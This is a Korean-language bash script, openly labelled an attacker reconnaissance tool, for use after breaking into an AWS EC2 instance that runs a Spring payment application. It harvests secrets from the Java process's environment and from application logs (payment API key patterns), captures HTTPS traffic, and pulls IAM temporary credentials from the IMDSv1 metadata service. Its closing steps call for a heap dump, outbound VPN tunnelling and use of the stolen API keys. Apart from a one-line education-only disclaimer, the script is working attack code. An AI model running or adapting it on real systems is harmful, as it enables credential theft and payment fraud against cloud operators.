#!/bin/bash

##############################################################################
# 공격자 정찰 스크립트
# 목적: EC2 인스턴스 침투 후 NAT Gateway 아웃바운드 확인 및 정보 수집
#
# 사용법:
#   chmod +x attacker-recon.sh
#   sudo ./attacker-recon.sh
##############################################################################

set -e

BOLD='\033[1m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# 로그 파일
RECON_LOG="/tmp/attacker-recon-$(date +%Y%m%d-%H%M%S).log"

echo -e "${BOLD}${RED}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║       공격자 정찰 스크립트 - NAT Gateway 아웃바운드 확인       ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

log_section() {
    echo -e "\n${BOLD}${YELLOW}[*] $1${NC}" | tee -a "$RECON_LOG"
    echo "================================================================" | tee -a "$RECON_LOG"
}

log_info() {
    echo -e "${GREEN}[+]${NC} $1" | tee -a "$RECON_LOG"
}

log_error() {
    echo -e "${RED}[-]${NC} $1" | tee -a "$RECON_LOG"
}

##############################################################################
# STEP 1: 네트워크 기본 정보 수집
##############################################################################
log_section "STEP 1: 네트워크 기본 정보 수집"

log_info "현재 인터페이스 및 Private IP 확인"
ip addr show | grep -E "inet " | tee -a "$RECON_LOG"

log_info "라우팅 테이블 확인"
ip route show | tee -a "$RECON_LOG"

log_info "NAT Gateway를 통한 Public IP 확인"
PUBLIC_IP=$(curl -s --max-time 5 http://checkip.amazonaws.com || echo "Failed")
if [ "$PUBLIC_IP" != "Failed" ]; then
    log_info "Public IP (NAT Gateway): $PUBLIC_IP"
else
    log_error "Public IP 확인 실패"
fi

##############################################################################
# STEP 2: DNS 및 외부 연결 테스트
##############################################################################
log_section "STEP 2: DNS 및 외부 연결 테스트"

log_info "Google DNS 연결 테스트"
if ping -c 3 8.8.8.8 &>/dev/null; then
    log_info "✓ 외부 네트워크 연결 가능"
else
    log_error "✗ 외부 네트워크 연결 실패"
fi

log_info "HTTPS 연결 테스트 (google.com)"
if curl -Is --max-time 5 https://www.google.com | head -1 | tee -a "$RECON_LOG"; then
    log_info "✓ HTTPS 아웃바운드 연결 가능"
else
    log_error "✗ HTTPS 연결 실패"
fi

log_info "DNS 조회 테스트"
nslookup www.google.com | tee -a "$RECON_LOG"

##############################################################################
# STEP 3: Spring 애플리케이션 프로세스 확인
##############################################################################
log_section "STEP 3: Spring 애플리케이션 프로세스 확인"

log_info "Java/Spring 프로세스 검색"
JAVA_PID=$(pgrep -f 'java.*spring' || pgrep -f 'java.*tomcat' || echo "")

if [ -n "$JAVA_PID" ]; then
    log_info "✓ Java 프로세스 발견: PID $JAVA_PID"
    ps aux | grep -E "$JAVA_PID" | grep -v grep | tee -a "$RECON_LOG"

    log_info "프로세스 환경 변수 확인 (API 키 탐색)"
    if [ -r "/proc/$JAVA_PID/environ" ]; then
        cat "/proc/$JAVA_PID/environ" | tr '\0' '\n' | grep -iE "api|key|secret|password" | tee -a "$RECON_LOG" || log_info "환경 변수에서 민감 정보 없음"
    else
        log_error "환경 변수 읽기 권한 없음 (root 필요)"
    fi

    log_info "프로세스가 열고 있는 파일 확인"
    if command -v lsof &>/dev/null; then
        lsof -p "$JAVA_PID" 2>/dev/null | grep -iE "log|properties|config" | tee -a "$RECON_LOG"
    else
        log_error "lsof 명령어 없음"
    fi
else
    log_error "Java/Spring 프로세스를 찾을 수 없음"
fi

##############################################################################
# STEP 4: 애플리케이션 로그 확인 (API 키 탐색)
##############################################################################
log_section "STEP 4: 애플리케이션 로그에서 민감 정보 탐색"

LOG_DIRS=(
    "/var/log/spring-app"
    "/var/log/tomcat"
    "/var/log/application"
    "/opt/tomcat/logs"
    "/home/ec2-user/logs"
)

for LOG_DIR in "${LOG_DIRS[@]}"; do
    if [ -d "$LOG_DIR" ]; then
        log_info "로그 디렉토리 발견: $LOG_DIR"

        log_info "PG API 관련 로그 검색"
        grep -r -iE "pg.*api|payment|api.*key|bearer|authorization" "$LOG_DIR" 2>/dev/null | head -20 | tee -a "$RECON_LOG" || log_info "관련 로그 없음"

        log_info "API 키 패턴 검색 (test_sk_, MID_)"
        grep -r -E "test_sk_[A-Za-z0-9]+|MID_[A-Za-z0-9_]+" "$LOG_DIR" 2>/dev/null | head -10 | tee -a "$RECON_LOG" || log_info "API 키 패턴 없음"

        log_info "최근 로그 파일 확인"
        find "$LOG_DIR" -type f -name "*.log" -mtime -1 -exec ls -lh {} \; | tee -a "$RECON_LOG"
    fi
done

##############################################################################
# STEP 5: 활성 네트워크 연결 확인
##############################################################################
log_section "STEP 5: 활성 네트워크 연결 확인"

log_info "현재 ESTABLISHED 연결 확인"
netstat -tun 2>/dev/null | grep ESTABLISHED | tee -a "$RECON_LOG" || ss -tun | grep ESTAB | tee -a "$RECON_LOG"

log_info "HTTPS(443) 연결 확인"
netstat -tun 2>/dev/null | grep ":443" | tee -a "$RECON_LOG" || ss -tun | grep ":443" | tee -a "$RECON_LOG"

log_info "리스닝 포트 확인"
netstat -tuln 2>/dev/null | grep LISTEN | tee -a "$RECON_LOG" || ss -tuln | grep LISTEN | tee -a "$RECON_LOG"

##############################################################################
# STEP 6: PG API 엔드포인트 연결 테스트
##############################################################################
log_section "STEP 6: PG API 엔드포인트 연결 테스트"

PG_API_URL="https://api.example-pg.com"

log_info "PG API DNS 조회: $PG_API_URL"
nslookup api.example-pg.com 2>/dev/null || dig api.example-pg.com +short || log_error "DNS 조회 실패"

log_info "PG API 연결 테스트"
curl -v --max-time 5 "$PG_API_URL" 2>&1 | grep -E "Connected|Trying|Host|SSL" | tee -a "$RECON_LOG" || log_info "연결 시도 완료"

##############################################################################
# STEP 7: 패킷 캡처 (tcpdump가 있는 경우)
##############################################################################
log_section "STEP 7: 네트워크 트래픽 캡처 (10초간)"

if command -v tcpdump &>/dev/null; then
    log_info "HTTPS(443) 트래픽 캡처 시작 (10초)"
    timeout 10 tcpdump -i any -nn 'port 443' -c 20 2>&1 | tee -a "$RECON_LOG" || log_info "패킷 캡처 완료"
else
    log_error "tcpdump 명령어 없음"
fi

##############################################################################
# STEP 8: AWS 메타데이터 서비스 확인 (IMDSv1)
##############################################################################
log_section "STEP 8: AWS EC2 메타데이터 서비스 확인"

log_info "EC2 인스턴스 메타데이터 확인 (IMDSv1)"
INSTANCE_ID=$(curl -s --max-time 3 http://169.254.169.254/latest/meta-data/instance-id || echo "Failed")
if [ "$INSTANCE_ID" != "Failed" ]; then
    log_info "✓ Instance ID: $INSTANCE_ID"

    log_info "IAM Role 확인"
    IAM_ROLE=$(curl -s --max-time 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/ || echo "None")
    if [ "$IAM_ROLE" != "None" ] && [ -n "$IAM_ROLE" ]; then
        log_info "✓ IAM Role: $IAM_ROLE"

        log_info "IAM 임시 자격 증명 확인"
        curl -s --max-time 3 "http://169.254.169.254/latest/meta-data/iam/security-credentials/$IAM_ROLE" | tee -a "$RECON_LOG"
    else
        log_info "IAM Role 없음"
    fi

    log_info "서브넷 정보"
    curl -s --max-time 3 http://169.254.169.254/latest/meta-data/network/interfaces/macs/$(curl -s http://169.254.169.254/latest/meta-data/mac)/subnet-id | tee -a "$RECON_LOG"
else
    log_error "메타데이터 서비스 접근 실패 (IMDSv2 강제 또는 차단됨)"
fi

##############################################################################
# STEP 9: 시스템 로그 확인
##############################################################################
log_section "STEP 9: 시스템 보안 로그 확인"

log_info "최근 SSH 로그인 시도"
if [ -f /var/log/secure ]; then
    tail -30 /var/log/secure | grep -iE "ssh|accepted|failed" | tee -a "$RECON_LOG"
elif [ -f /var/log/auth.log ]; then
    tail -30 /var/log/auth.log | grep -iE "ssh|accepted|failed" | tee -a "$RECON_LOG"
fi

log_info "최근 sudo 명령어"
if [ -f /var/log/secure ]; then
    tail -20 /var/log/secure | grep sudo | tee -a "$RECON_LOG"
fi

##############################################################################
# STEP 10: 탐색 결과 요약
##############################################################################
log_section "STEP 10: 정찰 결과 요약"

echo -e "\n${BOLD}${GREEN}=== 정찰 완료 ===${NC}" | tee -a "$RECON_LOG"
echo -e "${GREEN}[✓] Public IP (NAT): $PUBLIC_IP${NC}" | tee -a "$RECON_LOG"
echo -e "${GREEN}[✓] Instance ID: $INSTANCE_ID${NC}" | tee -a "$RECON_LOG"
echo -e "${GREEN}[✓] Java Process PID: $JAVA_PID${NC}" | tee -a "$RECON_LOG"
echo -e "${GREEN}[✓] 로그 파일: $RECON_LOG${NC}"

echo -e "\n${YELLOW}다음 단계:${NC}"
echo -e "  1. /var/log/spring-app/pg-api.log 에서 API 키 확인"
echo -e "  2. 메모리 덤프: jmap -dump:format=b,file=/tmp/heap.bin $JAVA_PID"
echo -e "  3. OpenVPN 설치 및 아웃바운드 터널링 구성"
echo -e "  4. 탈취한 API 키로 PG API 직접 호출 테스트"

echo -e "\n${BOLD}${RED}[!] 경고: 이 스크립트는 교육/연구 목적으로만 사용하세요.${NC}\n"
